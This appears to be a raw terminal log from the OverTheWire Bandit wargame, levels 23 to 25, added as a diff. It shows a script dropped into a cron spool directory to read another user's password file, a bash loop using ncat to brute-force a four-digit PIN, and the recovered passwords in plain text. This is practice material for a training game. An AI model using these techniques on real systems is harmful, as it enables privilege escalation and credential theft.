@@ -1,0 +1,106 @@
+bandit23@melinda:/tmp/gubug$ echo "cat /etc/bandit_pass/bandit24 > /tmp/gubug/pass" > sh.sh
+bandit23@melinda:/tmp/gubug$ chmod 777 sh.sh
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7872
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:19 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:20 ..
+-rw-rw-r-- 1 bandit23 bandit23       0 Dec  2 09:19 pass
+-rwxrwxrwx 1 bandit23 bandit23      48 Dec  2 09:20 sh.sh
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ cp sh.sh test
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7876
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:20 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:20 ..
+-rw-rw-r-- 1 bandit23 bandit23       0 Dec  2 09:19 pass
+-rwxrwxrwx 1 bandit23 bandit23      48 Dec  2 09:20 sh.sh
+-rwxrwxr-x 1 bandit23 bandit23      48 Dec  2 09:20 test
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ rm pass
+bandit23@melinda:/tmp/gubug$ ./sh.sh
+cat: /etc/bandit_pass/bandit24: Permission denied
+bandit23@melinda:/tmp/gubug$ vim sh.sh
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7876
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:20 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:20 ..
+-rw-rw-r-- 1 bandit23 bandit23       0 Dec  2 09:20 pass
+-rwxrwxrwx 1 bandit23 bandit23      48 Dec  2 09:20 sh.sh
+-rwxrwxr-x 1 bandit23 bandit23      48 Dec  2 09:20 test
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ rm pass
+bandit23@melinda:/tmp/gubug$ vm sh.sh /var/spool/
+bandit24/ cron/     mail/     plymouth/ rsyslog/
+bandit23@melinda:/tmp/gubug$ vm sh.sh /var/spool/bandit24/
+-bash: vm: command not found
+bandit23@melinda:/tmp/gubug$ mv sh.sh /var/spool/bandit24/
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7872
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:20 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:20 ..
+-rwxrwxr-x 1 bandit23 bandit23      48 Dec  2 09:20 test
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7872
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:20 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:20 ..
+-rwxrwxr-x 1 bandit23 bandit23      48 Dec  2 09:20 test
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ ls -al /var/spool/bandit24
+total 153
+drwxrwxr-x 2 bandit24 bandit23 151552 Dec  2 09:21 .
+drwxr-xr-x 6 root     root       4096 May  3  2015 ..
+bandit23@melinda:/tmp/gubug$ ls -al
+total 7876
+drwxrwxrwx 2 bandit23 bandit23    4096 Dec  2 09:21 .
+drwxrwx-wt 1 root     root     8036352 Dec  2 09:21 ..
+-rw-rw-r-- 1 bandit24 bandit24      33 Dec  2 09:21 pass
+-rwxrwxr-x 1 bandit23 bandit23      48 Dec  2 09:20 test
+-rwxr-xr-x 1 bandit23 bandit23     265 Dec  2 09:14 test.sh
+bandit23@melinda:/tmp/gubug$ cat pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+
+
+
+
+
+
+
+
+
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+for i in {1000..9999}
+do 
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" > /tmp/gubug
+	cat /tmp/gubug >> /tmp/gubug_ret/$i
+	ncat localhost 30002 </tmp/gubug | grep -Ev "Please enter the correct pincode. Try again.|Exiting.|Please enter the password for user bandit24 and the secret pincode on a single line" >> /tmp/gubug_ret/$i &
+	sleep 0.1
+done
+
+
+bandit24@melinda:/tmp/gubug_ret$ cat /tmp/gubug_ret/5669
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+
+
+
+
+
+
+
+ssh -l bandit26 bandit.labs.overthewire.org -i pass.key
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
